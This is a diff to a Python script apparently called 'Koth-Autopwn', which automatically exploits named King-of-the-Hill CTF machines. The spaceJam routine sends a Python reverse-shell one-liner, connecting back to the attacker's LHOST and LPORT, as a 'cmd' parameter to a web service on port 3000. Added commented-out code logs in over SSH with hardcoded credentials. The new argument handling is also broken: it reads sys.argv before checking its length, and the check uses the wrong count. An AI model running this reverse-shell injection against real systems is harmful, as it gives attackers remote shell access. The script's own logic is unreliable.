@@ -6,7 +6,7 @@ import argparse
 
 # machineName = input("Enter Machine Name: ")
 sess = requests.session()
-usage = f"{sys.argv[0]} -n/--name <Machine Name> -i/--ip <Machine Ip>"
+usage = f"{sys.argv[0]} <Machine Name> <Machine Ip>"
 
 # -------------------------------------------------- Shrek -------------------------------------------------- #
 def Shrek():
@@ -121,7 +121,6 @@ def Lion():
     os.system(command)
     print(command)
 
-
 def spaceJam():
     global ip, sess
     input("[*] Listen On Any Port And Press Enter")
@@ -130,16 +129,20 @@ def spaceJam():
     payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({LHOST},{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
     sess.get(f"http://{ip}:3000/?cmd={payload}")
 
+# def food():
+#     global ip
+#     req = ssh(host=ip, user="ramen", password="noodlesRTheBest")
+#     shell = req.process("/bin/sh")
+#     shell.interactive()
 
 if __name__ == "__main__":
+    
+    machineName = sys.argv[1]
+    ip = sys.argv[2]
+    
+    if len(sys.argv) != 2:
+        print(usage)
 
-    parser = argparse.ArgumentParser(description='Koth-Autopwn', usage=usage)
-    parser.add_argument('-i', '--ip', required=True)
-    parser.add_argument('-n', '--name', required=True)
-    args = parser.parse_args()
-
-    machineName = args.n
-    ip = args.i
     if machineName.lower() == "tyler":
         Tyler()
     if machineName.lower() == "production":
@@ -156,6 +159,8 @@ if __name__ == "__main__":
         Lion()
     if machineName.lower() == "spacejam":
         spaceJam()
+    # if machineName.lower() == "food":
+    #     food()
     else:
         print("[!] Invalid Machine Name")
         exit()
